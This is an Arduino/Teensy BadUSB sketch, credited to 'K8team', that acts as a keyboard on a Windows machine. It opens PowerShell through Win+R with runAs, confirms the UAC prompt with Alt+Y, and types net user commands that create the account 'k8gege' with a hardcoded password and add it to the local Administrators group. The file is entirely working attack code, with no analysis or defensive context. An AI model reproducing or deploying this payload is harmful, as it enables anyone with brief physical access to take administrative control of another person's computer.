//PS addAdminUser by K8team 2015.4.12
#define PS_ADMIN "powershell.exe -command start-process powershell -verb runAs"
# define PAYLOAD_USER_ADD "net user k8gege k8gege520 /add"
# define PAYLOAD_GROUP_ADD "net localgroup Administrators k8gege /add"


void setup(){
  EP();
  add_user();
Keyboard.println("exit");
  delay(50);
}

void loop(){
}

void run(char *SomeCommand){
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI); 
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();
  
  delay(1500);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  
  Keyboard.print(SomeCommand);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void add_user(){
delay(2000);
Keyboard.println(PAYLOAD_USER_ADD);
delay(2000);
Keyboard.println(PAYLOAD_GROUP_ADD);
delay(1000);

}
void EP(){
  delay(5000);
  run(PS_ADMIN);
  delay(15000);
  send_alt_y();
  //delay(10000);
  //Keyboard.println("Set-ExecutionPolicy Unrestricted -Force ");
  //delay(5000);
  Keyboard.println("exit");
  //delay(1000);
  }

void send_alt_y(){
  delay(1000);
  Keyboard.set_modifier(MODIFIERKEY_ALT); 
  Keyboard.set_key1(KEY_Y);
  Keyboard.send_now();
  delay(100);
  
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  }
